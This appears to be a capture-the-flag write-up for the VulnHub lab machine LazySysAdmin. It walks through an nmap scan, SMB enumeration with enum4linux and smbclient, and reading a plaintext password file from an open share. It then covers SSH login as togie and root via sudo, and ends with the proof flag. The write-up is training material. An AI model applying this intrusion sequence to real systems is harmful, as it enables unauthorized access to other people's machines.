LazyAdmin: 1 write-up


scan host:

nmap -sV -A -sC -p- 192.168.2.90

nmap result:

	PORT     STATE SERVICE     VERSION
	22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
	|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
	|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
	80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
	|_http-generator: Silex v2.2.7
	| http-robots.txt: 4 disallowed entries 
	|_/old/ /test/ /TR2/ /Backnode_files/
	|_http-server-header: Apache/2.4.7 (Ubuntu)
	|_http-title: Backnode
	139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: LAZYSYSADMIN)
	445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: LAZYSYSADMIN)
	3306/tcp open  mysql       MySQL (unauthorized)
	6667/tcp open  irc         InspIRCd
	| irc-info: 
	|   server: Admin.local
	|   users: 1
	|   servers: 1
	|   chans: 0
	|   lusers: 1
	|   lservers: 0
	|   source ident: nmap
	|   source host: 192.168.2.38
	|_  error: Closing link: (nmap@192.168.2.38) [Client exited]
	Service Info: Host: Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| smb-os-discovery: 
	|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
	|   Computer name: lazysysadmin
	|   NetBIOS computer name: LAZYSYSADMIN
	|   Domain name: 
	|   FQDN: lazysysadmin
	|_  System time: 2017-11-01T04:00:05+10:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_smbv2-enabled: Server supports SMBv2 protocol



enum smb: using enum4linux tool (./enum4linux.pl -U 192.168.2.90)

from enum result see a user on the system: togie


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\togie (Local User)


also smb shares:


	WARNING: The "syslog" option is deprecated
	Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
	Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

		Sharename       Type      Comment
		---------       ----      -------
		print$          Disk      Printer Drivers
		share$          Disk      Sumshare
		IPC$            IPC       IPC Service (Web server)

		Server               Comment



connect to smb share:


	smbclient //192.168.2.90/share$


see file list:


	smb: \> 
	smb: \> dir
	  .                                   D        0  Tue Aug 15 07:05:52 2017
	  ..                                  D        0  Mon Aug 14 08:34:47 2017
	  wordpress                           D        0  Tue Oct 31 13:49:52 2017
	  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017
	  wp                                  D        0  Tue Aug 15 06:51:23 2017
	  deets.txt                           N      139  Mon Aug 14 08:20:05 2017
	  robots.txt                          N       92  Mon Aug 14 08:36:14 2017
	  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017
	  apache                              D        0  Mon Aug 14 08:35:19 2017
	  index.html                          N    36072  Sun Aug  6 01:02:15 2017
	  info.php                            N       20  Tue Aug 15 06:55:19 2017
	  test                                D        0  Mon Aug 14 08:35:10 2017
	  old                                 D        0  Mon Aug 14 08:35:13 2017




Open deets.txt in browser: http://192.168.2.90/deets.txt
"
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
"


login to system over ssh with user:togie and password: 12345


togie user in sudories so just execute sudo su to become a root user:


get proof.txt in root:


WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu

![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/lazysysadmin-1/proof.png)